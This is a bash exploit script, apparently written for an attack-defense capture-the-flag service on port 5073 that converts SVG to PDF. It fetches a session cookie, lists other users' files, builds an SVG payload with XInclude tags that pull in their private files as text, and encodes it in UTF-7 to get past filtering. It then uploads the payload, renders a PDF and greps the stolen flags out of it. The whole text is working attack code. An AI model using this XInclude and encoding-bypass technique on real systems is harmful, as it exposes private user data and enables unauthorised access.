#!/bin/bash
# Requirements: bbe, jq, pdftotext, curl

host=$1
port=5073

userId=$(curl -v -ccookies.txt "http://$host:$port/api/me")
>&2 echo -e "userId=\033[1;33m$userId\033[0m"

includes=$(curl -v -bcookies.txt "http://$host:$port/api/list?skip=0&take=20" | bbe -e 's/},{/}\n{/' | tr -d '][-' | grep true | jq -r '"<text x=\"10\" y=\""+(input_line_number*10|tostring)+"\" font-size=\"1\" transform=\"scale(0.1)\"><xi:include href=\"./"+.userId+"-"+.fileId+"-"+(.isPrivate|tostring)+"-true.svg\" parse=\"text\"/></text>"')
svg=$(printf "<svg width=\x22999\x22 height=\x22480\x22 xmlns=\x22http://www.w3.org/2000/svg\x22 xmlns:xi=\x22http://www.w3.org/2001/XInclude\x22>\n $includes \n</svg>\n" | iconv -f utf-8 -t utf-7)
>&2 echo -e "\033[1;33mPAYLOAD:\033[0m"
>&2 echo $svg

fileId=$(curl -v -bcookies.txt "http://$host:$port/api/svg" -d "isPrivate=true" --data-urlencode "data=<?xml version='1.0' encoding='utf-7'?><svg width='999' height='480'>$svg</svg>")
>&2 echo -e "fileId=\033[1;33m$fileId\033[0m"

rm -f flags.pdf flags.txt
curl -v -bcookies.txt -o flags.pdf "http://$host:$port/api/pdf?userId=$userId&fileId=$fileId&isPrivate=true"
pdftotext -raw flags.pdf flags.txt

>&2 echo -e "\033[1;33mFLAGS:\033[0m"
cat flags.txt | grep -oE "\w{31}="
